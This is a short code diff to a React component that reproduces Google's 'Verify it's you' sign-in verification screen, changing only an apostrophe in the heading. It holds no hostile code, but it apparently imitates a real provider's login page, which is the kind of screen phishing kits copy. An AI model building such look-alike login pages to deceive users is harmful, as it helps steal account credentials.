@@ -29,7 +29,7 @@ function ChooseVerifyWay({ isLoading}:TAuthProps) {
         </div>
 
         <div className="flex flex-col gap-2 items-center my-4">
-          <div className="text-xl text-[#202124]">Verify it's you</div>
+          <div className="text-xl text-[#202124]">Verify it’s you</div>
           <div className=" text-[#202124] text-center ">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</div>
           <div  className="text-[#1a73e8] font-medium cursor-pointer">Learn more</div>
           <div className="flex items-center justify-center rounded-full border border-gray-300 p-1 gap-2">
